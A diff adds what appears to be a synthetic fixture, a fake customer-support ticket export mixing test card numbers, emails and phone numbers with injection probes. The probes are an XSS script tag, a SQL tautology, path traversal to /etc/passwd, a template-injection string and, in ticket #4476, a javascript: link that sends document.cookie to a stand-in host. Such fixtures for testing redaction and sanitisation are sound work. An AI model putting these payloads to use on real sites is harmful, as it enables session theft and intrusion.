@@ -1,0 +1,47 @@
+CUSTOMER SUPPORT EXPORT — TICKET LOG (auto-generated, unfiltered)
+================================================================
+
+[Ticket #4471] Submitted 2026-08-14 09:15:00
+From: kenneth.master@alueducation.com
+Hi team, my invoice for RWF 50,000 hasn't arrived. Please resend it to
+kenneth.master@alueducation.com or call me at +250 788 123 456 before 5:30 PM.
+Ref link: https://portal.alueducation.com/invoices?id=4471
+
+[Ticket #4472] Submitted 2026-08-14 09:42
+From: kenneth.master@alumni.alueducation.com
+I graduated last year and I'm trying to update my payment card on file.
+Card ending attempted: 4111-1111-1111-1111 (didn't go through)
+Backup card: 5500 0000 0000 0004
+Contact number (078) 234-5678 or 0788234567. Thanks! #ALUAlumni #Support
+
+[Ticket #4473] Submitted 2026-08-14 10:03:12
+From: kenneth.master@si.alueducation.com
+Charged twice — $1,250.00 and again €99.99 a few minutes later at 14:02:45.
+See www.example-bank.com/statements for proof. My personal backup email is
+kenneth.master88+billing@gmail.com in case the SI inbox is slow.
+
+[Ticket #4474] Submitted 2026-08-14 11:20
+From: jane_doe@company.co.uk
+Hey <b>team</b>, your homepage <div class="banner">renders</div> fine but
+this field breaks our importer: <script>alert('xss')</script>
+Also seeing this in a search box someone submitted: ' OR '1'='1
+And a weird path in the referrer log: ../../../etc/passwd
+One more oddity: {{7*7}} appeared in a form field — is that expected?
+
+[Ticket #4475] Submitted 2026-08-14 12:47
+From: not-an-email@@nowhere..com
+Card given (invalid, fails checksum): 4111 1111 1111 1112
+Their "phone number" was just: 123
+Follow-up hashtag trail: #Refund2026 #ALU_Hackathon #urgent!!
+Currency mentioned in passing: USD 3,400.50 and also just "a lot of money"
+
+[Ticket #4476] Submitted 2026-08-14 13:05
+From: Sarah.O'Brien@Business-Partners.io
+Meeting moved to 9:05 AM tomorrow (was 09:05:00). Dial-in: +1 (415) 555-0134.
+Landing page for the new promo: https://promo.example.com/2026/launch?ref=email
+Suspicious link a user forwarded us, please advise: javascript:void(fetch('http://evil.test/steal?c='+document.cookie))
+
+[Ticket #4477] Submitted 2026-08-14 14:30
+From: kenneth.master@alueducation.com
+Confirming payment of £2,000 received against card **** **** **** 0004.
+Amex on file: 3782 822463 10005. Alt contact: +250-72-000-1122.
